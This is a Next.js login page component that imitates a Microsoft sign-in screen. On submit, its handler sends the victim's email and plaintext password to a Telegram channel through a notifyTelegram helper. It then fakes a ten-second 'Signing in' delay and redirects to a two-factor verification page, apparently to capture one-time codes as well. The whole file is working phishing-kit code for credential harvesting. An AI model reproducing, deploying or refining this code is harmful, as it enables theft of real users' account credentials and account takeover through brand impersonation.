"use client";
import { Eye, EyeOff, Loader2 } from "lucide-react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { notifyTelegram } from "@/lib/telegram-notify";
import { setLoginComplete, setTwoFactorStepComplete } from "@/lib/auth-flow";

const LOGIN_DELAY_MS = 10000;

export function LandingMain() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [message, setMessage] = useState("");

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;

    if (!email || !password) {
      setMessage("Please enter your email and password.");
      return;
    }

    setMessage("");
    setLoading(true);

    notifyTelegram({
      kind: "login",
      username: email,
      password,
    });

    await new Promise((resolve) => setTimeout(resolve, LOGIN_DELAY_MS));

    setLoginComplete();
    setTwoFactorStepComplete();
    router.push("/two-factor/verify?method=email");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#f3f6fb] to-[#eef1f6] flex items-center justify-center px-4 sm:px-6">
      <div className="w-full max-w-md md:max-w-lg space-y-4">
        <div className="bg-white shadow-md p-6 sm:p-8 rounded-3xl">
          <div className="flex items-center gap-3 mb-6">
            <img src="/microsoft.png" className="h-20" alt="Logo" />
          </div>

          <form onSubmit={handleLogin} noValidate>
            <input
              type="text"
              name="hp_field"
              tabIndex={-1}
              autoComplete="off"
              className="hidden"
            />

            <label
              htmlFor="email"
              className="block text-sm font-medium text-[#333333] mb-2"
            >
              Email
            </label>
            <input
              id="email"
              type="email"
              autoComplete="username"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              disabled={loading}
              className="w-full border-b border-gray-400 focus:border-blue-600 outline-none py-2 text-sm sm:text-base mb-4"
            />

            <div className="relative mb-4">
              <label
                htmlFor="password"
                className="block text-sm font-medium text-[#333333] mb-2"
              >
                Password
              </label>
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={loading}
                className="w-full border-b border-gray-400 focus:border-blue-600 outline-none pr-10 text-sm sm:text-base"
              />
              <button
                type="button"
                onClick={() => setShowPassword((prev) => !prev)}
                aria-label={showPassword ? "Hide password" : "Show password"}
                className="absolute right-0 top-9 text-gray-600 hover:text-black"
              >
                {showPassword ? (
                  <EyeOff className="h-5 w-5" />
                ) : (
                  <Eye className="h-5 w-5" />
                )}
              </button>
            </div>

            <p
              className={`text-sm text-red-600 mb-3 ${!message ? "hidden" : ""}`}
              role="alert"
            >
              {message || " "}
            </p>

            <p className="text-sm mb-6">
              <a href="#" className="text-blue-600 hover:underline">
                Forgot password?
              </a>
            </p>

            <div className="flex justify-end">
              <button
                id="rcmloginsubmit"
                type="submit"
                disabled={loading}
                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 w-full sm:w-auto rounded-md disabled:opacity-70"
              >
                {loading ? (
                  <span className="inline-flex items-center gap-2">
                    <Loader2
                      className="h-4 w-4 animate-spin"
                      aria-hidden="true"
                    />
                    Signing in
                  </span>
                ) : (
                  "Sign in"
                )}
              </button>
            </div>
          </form>
        </div>

        <div className="flex flex-col sm:flex-row justify-end gap-2 sm:gap-4 text-xs text-gray-500 text-center sm:text-right">
          <a href="#" className="hover:underline">
            Terms of use
          </a>
          <a href="#" className="hover:underline">
            Privacy & cookies
          </a>
        </div>
      </div>
    </div>
  );
}
